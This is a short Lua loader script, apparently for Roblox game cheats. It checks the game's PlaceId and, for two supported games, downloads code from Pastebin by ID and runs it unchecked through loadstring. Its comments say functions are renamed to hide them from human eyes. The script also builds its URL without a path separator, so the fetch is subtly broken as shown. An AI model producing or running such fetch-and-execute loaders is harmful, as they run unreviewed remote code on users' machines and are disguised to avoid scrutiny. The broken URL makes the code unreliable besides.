--// Obfuscation-Friendly Config
local _P = game.PlaceId
local _I = "A8V7zx89" -- Iron Man
local _T = "SH80r9gk" -- TSB

--// Localizing functions to hide from human eyes
local _G = game
local _L = loadstring
local _W = warn

local function _LOAD(_ID)
    -- Using pcall to prevent the whole script from crashing on a fetch error
    local _S, _RES = pcall(function()
        return _G:HttpGet("https://pastebin.com" .. _ID)
    end)

    if _S and _RES then
        local _F, _E = _L(_RES)
        if _F then
            _F()
        else
            _W("Script execution failed: " .. tostring(_E))
        end
    else
        _W("Fetch Error: Connection to Pastebin failed.")
    end
end

--// Execution Logic
if _P == 16929212566 then
    _LOAD(_I)
elseif _P == 10449761463 then
    _LOAD(_T)
else
    _W("Game not supported. PlaceId: " .. _P)
end
